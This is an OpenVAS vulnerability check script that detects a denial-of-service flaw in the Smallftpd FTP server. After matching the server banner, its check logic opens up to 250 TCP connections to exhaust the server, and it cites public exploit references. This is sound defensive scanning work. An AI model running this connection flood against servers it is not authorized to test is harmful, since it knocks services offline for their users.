###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_smallftpd_mult_requests_dos_vuln.nasl 4704 2016-12-07 14:26:08Z cfi $
#
# Smallftpd FTP Server Multiple Requests Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902453");
  script_version("$Revision: 4704 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-07 15:26:08 +0100 (Wed, 07 Dec 2016) $");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Smallftpd FTP Server Multiple Requests Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("FTP");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/ftp", 21);

  tag_impact = "Successful exploitation will allow unauthenticated attackers to
  cause a denial of service.

  Impact Level: Application";

  tag_affected = "Smallftpd version 1.0.3-fix and prior.";

  tag_insight = "The flaw is due to an error when handling the multiple requests
  from the client. It is unable to handle multiple connections regardless
  of its maximum connection settings.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "The host is running Smallftpd FTP Server and is prone to denial of
  service vulnerability.";

  script_xref(name:"URL", value:"http://www.1337day.com/exploits/16423");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17455/");

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application installed
banner = get_ftp_banner(port:ftpPort);
if("220- smallftpd" >!< banner){
  exit(0);
}

## Open the multiple sockets on port 21. if it fails exit
for(i=0; i<250; i++)
{
  soc = open_sock_tcp(ftpPort);
  if(!soc)
  {
    security_message(port:ftpPort);
    exit(0);
  }
}

ftp_close(socket:soc);
